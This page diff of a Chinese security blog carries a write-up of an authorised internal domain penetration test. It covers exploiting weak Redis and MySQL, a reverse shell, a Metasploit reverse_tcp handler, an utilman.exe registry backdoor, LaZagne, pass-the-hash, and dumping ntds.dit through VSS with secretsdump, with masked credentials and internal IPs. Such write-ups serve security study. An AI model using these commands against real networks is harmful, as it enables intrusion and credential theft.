-<h1 id="0x03-&#x6A2A;&#x5411;&#x79FB;&#x52A8;"><a href="#0x03-&#x6A2A;&#x5411;&#x79FB;&#x52A8;" class="headerlink" title="0x03 &#x6A2A;&#x5411;&#x79FB;&#x52A8;"></a>0x03 &#x6A2A;&#x5411;&#x79FB;&#x52A8;</h1><p>&#x901A;&#x8FC7;k00529 &#x57DF;&#x7528;&#x6237;&#x8FDB;&#x5165;&#x8DF3;&#x677F;&#x673A;&#xFF0C;&#x53D1;&#x73B0;&#x672A;&#x6CE8;&#x9500;&#x7684;&#x7528;&#x6237;token &#x6781;&#x5176;&#x591A;&#xFF0C;&#x5B8C;&#x5168;&#x53EF;&#x901A;&#x8FC7;&#x8DF3;&#x677F;&#x673A;&#x7684;&#x51ED;&#x8BC1; &#x8FDB;&#x5165; &#x4E2A;&#x4EBA;PC &#x673A;&#xFF0C;&#x7531;&#x4E8E;&#x65F6;&#x95F4;&#x4E3A;&#x767D;&#x5929;&#x3001;&#x6613;&#x88AB;&#x7BA1;&#x7406;&#x5458;&#x53D1;&#x73B0;&#xFF0C;&#x5C31;&#x4E0D;&#x5F97;&#x5DF2;&#x5B9E;&#x73B0;&#x3002;</p>
-<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5c8ca8082711cd74738fb839"><img src="https://www.yunzhijia.com/microblog/filesvr/5c8ca8082711cd74738fb839" alt="" class="ui centered image"></a></p>
-<p>&#x4ECE;dump&#x7684;&#x6570;&#x636E;&#x4E2D;&#xFF0C;&#x53D1;&#x73B0;&#x8FD9;&#x4E2A;&#x57DF;&#x7528;&#x6237;&#x7684;&#x5BC6;&#x7801;&#x6709;&#x4E2A;&#x89C4;&#x5F8B; :</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XXXtest01  XXX&#x4E3A;&#x56FA;&#x5B9A;&#x540D;&#x5B57; + test01 /test02 /test03</span><br></pre></td></tr></table></figure>
-<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5c8cbe839b521a131d01c3b8"><img src="https://www.yunzhijia.com/microblog/filesvr/5c8cbe839b521a131d01c3b8" alt="" class="ui centered image"></a><br>&#x901A;&#x8FC7;&#x89C4;&#x5F8B;&#x3001;&#x6210;&#x529F;pth&#x5230;&#x8FD1;100+ &#x57DF;&#x7528;&#x6237;&#xFF0C;&#x540C;&#x6837;&#xFF0C;&#x5E78;&#x8FD0;&#x7684;&#x662F; &#x5176;&#x4E2D;&#x6709;&#x4E24;&#x4E2A;&#x57DF;&#x7BA1;&#x3002;</p>
-<p>&#x8FD9;&#x5C31;&#x610F;&#x5473;&#x7684; dcxxx.com &#x8FD9;&#x4E2A;&#x57DF;&#x5DF2;&#x7ECF;&#x6CA6;&#x9677;&#x3002;</p>
-<p>&#x63A5;&#x4E0B;&#x6765; &#x5C31;&#x662F;&#x83B7;&#x53D6;&#x57DF;&#x63A7;&#x4E0B;&#x6240;&#x6709;&#x7528;&#x6237;&#x7684;hash</p>
-<p>&#x7528;VSS&#x5377;&#x5F71;&#x526F;&#x672C;&#x6765;&#x83B7;&#x53D6;&#x57DF;&#x63A7;&#x4E2D;&#x7684;ntds.dit &#x548C;system.hiv &#x6587;&#x4EF6;</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br><span class="line"></span><br><span class="line">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line"></span><br><span class="line">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system c:\system.hiv</span><br></pre></td></tr></table></figure>
-<p>&#x4F7F;&#x7528;impacket &#x7684; secretsdump.Py  &#x4ECE;ntds.dit&#x6587;&#x4EF6;&#x4E2D;&#x8F6C;&#x5B58;&#x50A8;NTLM hash</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python /root/impacket/examples/secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL</span><br></pre></td></tr></table></figure>
-<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5c8cb51ce67d0a40cbc8a460"><img src="https://www.yunzhijia.com/microblog/filesvr/5c8cb51ce67d0a40cbc8a460" alt="" class="ui centered image"></a></p>
-<p>&#x8FD9;&#x91CC;&#x4F7F;&#x7528;nmap&#x83B7;&#x53D6;&#x57DF;&#x7528;&#x6237;&#x5BF9;&#x5E94;&#x7684;IP&#xFF0C;&#x5B9A;&#x4F4D;&#x5728;&#x7EBF;&#x76EE;&#x6807;&#xFF0C;&#x8FDB;&#x884C;&#x7A83;&#x53D6;&#x8D44;&#x6599;&#x3002;</p>
-<p>&#x6700;&#x7EC8; &#x4ECE;&#x8D22;&#x52A1;&#x90E8;&#x95E8;&#x83B7;&#x53D6;&#x5230;&#x8BE5;&#x516C;&#x53F8;&#x7684;&#x4E0B;&#x5E74;&#x8BA1;&#x5212;&#xFF0C;&#x4EBA;&#x5458;&#x7EC4;&#x7EC7;&#x6784;&#x67B6;&#xFF0C;&#x8D22;&#x52A1;&#x62A5;&#x8868;&#xFF0C;&#x76C8;&#x5229;&#x60C5;&#x51B5;&#xFF0C;&#x4EE5;&#x53CA;&#x5185;&#x90E8;&#x76F8;&#x5173;work&#x6587;&#x6863;&#x7B49;&#x3002;</p>
-<p>&#x8FDB;&#x884C;&#x653E;&#x5F03;&#x6743;&#x9650;&#xFF0C;&#x5220;&#x9664;&#x540E;&#x95E8;&#xFF0C;&#x6240;&#x6709;&#x64CD;&#x4F5C;&#x5E76;&#x672A;&#x66F4;&#x6539;&#xFF0C;&#x4E0B;&#x8F7D;&#xFF0C;&#x5220;&#x9664;&#x7B49;&#x4E00;&#x5207;&#x635F;&#x5BB3;&#x8BE5;&#x516C;&#x53F8;&#x7684;&#x884C;&#x4E3A;&#x3002;</p>
-<h1 id="0x04-&#x603B;&#x7ED3;"><a href="#0x04-&#x603B;&#x7ED3;" class="headerlink" title="0x04 &#x603B;&#x7ED3;"></a>0x04 &#x603B;&#x7ED3;</h1><p>1&#x3001;&#x5728;&#x884C;&#x52A8;&#x4E4B;&#x524D;&#x601D;&#x8003;&#x51E0;&#x5206;&#x949F;&#xFF0C;&#x6709;&#x6CA1;&#x6709;&#x66F4;&#x597D;&#x7684;&#x529E;&#x6CD5;<br>2&#x3001;&#x601D;&#x8003;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x591A;&#x4E2A;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x7684;&#x5229;&#x5F0A;<br>3&#x3001;&#x9009;&#x53D6;&#x81EA;&#x5DF1;&#x719F;&#x6089;&#x7684;&#x534F;&#x8BAE;&#x8FDB;&#x884C;&#x4FE1;&#x606F;&#x641C;&#x96C6;<br>4&#x3001;&#x7F51;&#x7EDC;&#x547D;&#x4EE4;&#x4E00;&#x5B9A;&#x8981;&#x719F;<br>5&#x3001;&#x5BF9;&#x4E8E;&#x540E;&#x95E8;&#x8981;&#x52A0;&#x5F3A;&#x7EF4;&#x62A4;<br>6&#x3001;&#x6E17;&#x900F;&#x7684;&#x672C;&#x8D28;&#x662F;&#x4FE1;&#x606F;&#x641C;&#x96C6;&#xFF0C;&#x6BCF;&#x4E00;&#x6B21;&#x7684;&#x9879;&#x76EE;&#x5982;&#x679C;&#x78B0;&#x5230;&#x8FF7;&#x832B;&#x65E0;&#x89E3;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x8BF7;&#x7EE7;&#x7EED;&#x641C;&#x96C6;&#x3002;&#x800C;&#x4FE1;&#x606F;&#x641C;&#x96C6;&#x7684;&#x672C;&#x8D28;&#x662F;&#x6E17;&#x900F;&#x7684;&#x6C89;&#x601D;&#x3002;</p>
-
-                        
-                    </div>
-
-                    
-                    
-                    
-
-                    <div class="description post-description">
-    <span class="post-description-item">
-        <time datetime="2019-03-16T09:50:00.000Z" itemprop="datePublished">2019-03-16</time>
-
-    </span>
-    <span class="post-description-item">
+    <div class="index-left">
         
-    </span>
-</div>
-
-                </div>
-                
-                <div id="pagination" class="nav-web ui text container pagination">
-
-    <div class="ui stackable two column divided grid container">
-        <div class="row">
-            <div class="column nav-left">
-                
-
-                <a href="/c1y2m3.github.io/2019/04/02/15542127307091/" class="ui tiny button">
-
-                    <i class="angle left icon"></i>
-                    
-                    域渗透之Kerberoasting攻击
-                    
-
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/c1y2m3.github.io/">
+        </div>
+        <div class="name">
+            <i>John Doe</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/c1y2m3.github.io/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
                 </a>
-
-                
-            </div>
-            <div class="column nav-right">
-                
-
-                <a href="/c1y2m3.github.io/2019/02/06/两种使用python实现SSRF检测/" class="ui tiny button">
-                    
-                    python实现SSRF检测脚本
-                    
-                    <i class="angle right icon"></i></a>
-                
-            </div>
-        </div>
-    </div>
-
-</div>
-                
-            </div>
-
+            </li>
+            <li>
+                <a href="/c1y2m3.github.io/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li>
+                <a href="/c1y2m3.github.io/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li>
+                <a href="/c1y2m3.github.io/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
             
-            <div class="three wide computer three wide tablet column">
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-信息收集"><span class="toc-text">0x01 信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-后渗透的开始"><span class="toc-text">0x01 后渗透的开始</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-再一次克服困难"><span class="toc-text">0x02 再一次克服困难</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-横向移动"><span class="toc-text">0x03 横向移动</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-总结"><span class="toc-text">0x04 总结</span></a></li></ol>
+</div>
+    
+</div>
 
-                <div class="ui sticky article-toc" id="article-toc">
-                    <!-- toc -->
-                    <ol class="ui ordered list"><li><a href="#0x00-前言"><span>0x00 前言</span></a></li><li><a href="#0x01-信息收集"><span>0x01 信息收集</span></a></li><li><a href="#0x01-后渗透的开始"><span>0x01 后渗透的开始</span></a></li><li><a href="#0x02-再一次克服困难"><span>0x02 再一次克服困难</span></a></li><li><a href="#0x03-横向移动"><span>0x03 横向移动</span></a></li><li><a href="#0x04-总结"><span>0x04 总结</span></a></li></ol>
-                </div>
 
-            </div>
-            
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
 
         </div>
     </div>
 </div>
 
-
-                    <!--</div>-->
-                <!--</div>-->
-            <!--</div>-->
+        <div class="index-about-mobile">
+            <i>  </i>
         </div>
-        <div class="ui vertical footer segment">
-    <div class="ui center aligned container">
-        <div class="ui inverted section divider"></div>
-        &copy; 2019 <a href="/">John Doe</a>,
-        Powered by <a href="https://github.com/henryhuang/hexo-theme-aloha" target="_blank">Aloha</a> and <a href="http://hexo.io/" target="_blank">Hexo</a>.
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        记一次域渗透攻击测试
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-03-16 17:50:00</span></span>
+        
+        
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content ">
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前段参与了一个项目,在项目中,实行的范围在一个会议室，目的是检测内网安全,并需要拿到该公司的财务报表，此文将全部脱敏，涉及某厂商，中间会穿插一些小的知识点与细节。</p>
+<h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><p>一开始，通过沟通，拿到了内网所在的IP段及所对应的部门信息，由于内部wifi认证缺陷，导致dhcp分配给我了个白名单ip,并且绑定了我的MAC，使得我不使用入网账号直接连入办公网。</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8cbf602711cd7473912722" alt=""></p>
+<p>为了能尽快找到突破口，这里我直接用ms17-010,并得到以下结果:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">192.168.5.46(Windows7 Ultimate7601 ServicePack 1) 财务部\董办</span><br><span class="line">192.168.2.209(Windows Server2008R2 Standard 7600) </span><br><span class="line">192.168.20.75(Windows Server2012 R2) </span><br><span class="line">192.168.6.31(Windows 7 Enterprise  7601) 人力资源部</span><br><span class="line">192.168.7.98 (Windows7 Ultimate7601 ServicePack 1) 运维和安全</span><br><span class="line">192.168.8.81 (Windows7 Ultimate7601 ServicePack 1)  信息技术事业部</span><br><span class="line">192.168.8.124  (Windows7 Ultimate7601 ServicePack 1)</span><br></pre></td></tr></table></figure>
+<p>心想 内网中每个ip段都雨露均沾了，岂不是美滋滋，然而并不是这样,在后面发现由于内网存在趋势防火墙、360套餐，已经把特征流量进行了拦截，这就有点悲剧了， (后续) -&gt;  通过python发送shellcode 成功拿下 一台192.168.2.209 测试段的域控，推测是研发的测试机，故未深入。</p>
+<p>于是放弃了这个突破点，对内网的资产进行了探测，发现了大量研发部的mysql、dubbo、Jenkins、redis等弱口令，通过这些获取到了不少信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.3.2:6379 is Redis Unauthorized</span><br><span class="line">192.168.20.205:6379 is Redis Unauthorized </span><br><span class="line">192.168.2.252:6379 redis unauthorized   </span><br><span class="line"> 192.168.3.2:6379 redis unauthorized</span><br><span class="line">192.168.20.71:6379 redis unauthorized</span><br><span class="line">192.168.20.67:6379 redis username:null,password:123456</span><br><span class="line">192.168.20.68:6379 redis username:null,password:123456</span><br><span class="line">192.168.20.205:6379 redis unauthorized</span><br></pre></td></tr></table></figure>
+<p>由于安全设置问题，导致无法写入，最后只成功写入一台并反弹shell<br><img src="https://www.yunzhijia.com/microblog/filesvr/5c8c7e1bea3b4a6a8ff95b97" alt=""><br>后面又利用Supervisord远程代码执行、Jenkins等拿下了几台linux机器，当然，在内网中，这不值得一说，就不一样诉说了。</p>
+<h1 id="0x01-后渗透的开始"><a href="#0x01-后渗透的开始" class="headerlink" title="0x01 后渗透的开始"></a>0x01 后渗透的开始</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">192.168.8.38:3306 mysql username:root,password:123456</span><br><span class="line"> z00382.dcxxx.com  D:\dev_software\mysql-5.6.24-winx64</span><br><span class="line"> </span><br><span class="line">192.168.8.116:3306 mysql username:root,password:123456</span><br><span class="line"> x00552.dcxxx.com  C:/Program Files/MySQL/MySQL Server 5.5/</span><br><span class="line"></span><br><span class="line">192.168.8.123:3306 mysql username:root,password:root </span><br><span class="line">z00529.dcxxx.com  C:/Program Files/MySQL/MySQL Server 5.5/</span><br><span class="line"></span><br><span class="line">192.168.9.31:3306 mysql username:root,password:123456</span><br><span class="line">y00478.dcxxx.com    D:\fix_soft\mysql-5.7.22-winx64\</span><br></pre></td></tr></table></figure>
+<p>发现在域中，信息安全部 / 风险经营事业部 存在弱口令的mysql，在数据库内发现大量邮箱账户以及对应的AES加密后的密码，一波尝试未解开, 故还是使用UDF提权, 首先对其进行了一波系统信息收集。</p>
+<p>参考: <a href="https://www.freebuf.com/articles/system/163144.html" target="_blank" rel="noopener">利用MySQL UDF提权</a></p>
+<p>虽然有四个root权限，提权之路并不是那么的顺利，依然被趋势杀毒intercept了，但，视乎是域用户本地策略的缘故，还是成功的拿到了一台域主机的本地system权限。</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8c8b3f9b521a131dfebcc6" alt=""></p>
+<p>然后利用 powershell，进行反弹个meterpreter,进行后渗透，但查看进程无果，一样被拦的死死的。</p>
+<p>接下来的思路是:</p>
+<p>启用Guest账号 - &gt; 3389远程连接 -&gt; Mimikatz -&gt; Tscon-&gt; 进行横向移动 </p>
+<p>由于本地策略的问题，Guest没有权限进行rdp，后面发现本地存在xxx用户，</p>
+<p>为了加快进度，修改了本地xxx用户密码(不太优雅)，后面顺利的进入了桌面。</p>
+<p>原来进程里还有 360杀毒、趋势杀毒端，为了更好的维持权限，故丢个免杀上去。</p>
+<p>项目地址:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/secretsquirrel/the-backdoor-factory</span><br></pre></td></tr></table></figure>
+<p>原理：可执行二进制文件中有大量的00，这些00是不包含数据的，将这些数据替换成payload，并且在程序执行的时候，jump到代码段，来触发payload。 </p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8c99d850f8dd30da7e8b16" alt="微信截图_20190316143725.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.1.111</span><br><span class="line">lhost =&gt; 192.168.1.111</span><br><span class="line">msf exploit(handler) &gt; set lport 8080</span><br><span class="line">lport =&gt; 8080</span><br><span class="line">msf exploit(handler) &gt; exploit -j </span><br><span class="line">//开启本地监听</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8c98b59b521a131dff73b8" alt=""></p>
+<p>此时的环境不被允许允许Mimikatz、 当然，离线提取lsass.exe 也是可以的，为了能更快的提取到 明文密码， 故没采用此方法。</p>
+<h1 id="0x02-再一次克服困难"><a href="#0x02-再一次克服困难" class="headerlink" title="0x02 再一次克服困难"></a>0x02 再一次克服困难</h1><p>通过注册表劫持实现后门，修改注册表的命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure>
+<p>由于是system权限，也就很简单的通过tscon进入了域用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcxxx.com/k00529</span><br></pre></td></tr></table></figure>
+<p>此时 已经凌晨十二点了，</p>
+<p>在小伙伴的协助下， 对python进行封装、使用laZagne对目标获取明文密码。</p>
+<p>幸运的是 我们获取到了k00529 这个域用户的所有信息、例如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">主域dc:192.168.20.23 / sz1.dcxxx.com</span><br><span class="line">域管理员: 7个 .....</span><br><span class="line">跳板机:192.168.2.37 / 192.168.2.38</span><br><span class="line"></span><br><span class="line">Login: SMY\XXXXXX</span><br><span class="line">Password: XXXXX7900221A#*</span><br><span class="line"></span><br><span class="line">邮箱:mail.xxxx.com</span><br><span class="line">密码:XXXXXX</span><br><span class="line">堡垒机172.18.80.103  //办公网无法访问</span><br><span class="line"></span><br><span class="line">URL: &lt;http://svn.XXXX.com:80&gt; SVN Repo</span><br><span class="line">Login: k00529</span><br><span class="line">Password: XXXtest01 </span><br><span class="line"></span><br><span class="line">........</span><br></pre></td></tr></table></figure>
+<h1 id="0x03-横向移动"><a href="#0x03-横向移动" class="headerlink" title="0x03 横向移动"></a>0x03 横向移动</h1><p>通过k00529 域用户进入跳板机，发现未注销的用户token 极其多，完全可通过跳板机的凭证 进入 个人PC 机，由于时间为白天、易被管理员发现，就不得已实现。</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8ca8082711cd74738fb839" alt=""></p>
+<p>从dump的数据中，发现这个域用户的密码有个规律 :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XXXtest01  XXX为固定名字 + test01 /test02 /test03</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8cbe839b521a131d01c3b8" alt=""><br>通过规律、成功pth到近100+ 域用户，同样，幸运的是 其中有两个域管。</p>
+<p>这就意味的 dcxxx.com 这个域已经沦陷。</p>
+<p>接下来 就是获取域控下所有用户的hash</p>
+<p>用VSS卷影副本来获取域控中的ntds.dit 和system.hiv 文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br><span class="line"></span><br><span class="line">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line"></span><br><span class="line">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system c:\system.hiv</span><br></pre></td></tr></table></figure>
+<p>使用impacket 的 secretsdump.Py  从ntds.dit文件中转存储NTLM hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python /root/impacket/examples/secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8cb51ce67d0a40cbc8a460" alt=""></p>
+<p>这里使用nmap获取域用户对应的IP，定位在线目标，进行窃取资料。</p>
+<p>最终 从财务部门获取到该公司的下年计划，人员组织构架，财务报表，盈利情况，以及内部相关work文档等。</p>
+<p>进行放弃权限，删除后门，所有操作并未更改，下载，删除等一切损害该公司的行为。</p>
+<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>1、在行动之前思考几分钟，有没有更好的办法<br>2、思考一个问题多个解决方案的利弊<br>3、选取自己熟悉的协议进行信息搜集<br>4、网络命令一定要熟<br>5、对于后门要加强维护<br>6、渗透的本质是信息搜集，每一次的项目如果碰到迷茫无解的时候，请继续搜集。而信息搜集的本质是渗透的沉思。</p>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
     </div>
 </div>
 
     </div>
+</div>
 
 
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
 
+        
 
-<!-- scripts list from theme config.yml -->
+        
 
-<script src="//cdn.bootcss.com/jquery/3.1.0/jquery.min.js"></script>
+        
 
-<script src="//cdn.bootcss.com/semantic-ui/2.2.4/semantic.min.js"></script>
+        
 
-<script src="//cdn.bootcss.com/algoliasearch/3.18.1/algoliasearch.min.js"></script>
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
 
-<script src="//cdn.bootcss.com/algoliasearch-helper-js/2.13.0/algoliasearch.helper.min.js"></script>
-
-<script src="/c1y2m3.github.io/js/semantic-ui-algolia.js"></script>
-
-<script src="/c1y2m3.github.io/js/aloha-events.js"></script>
 
 
 
 </body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/c1y2m3.github.io/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/c1y2m3.github.io/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
 </html>
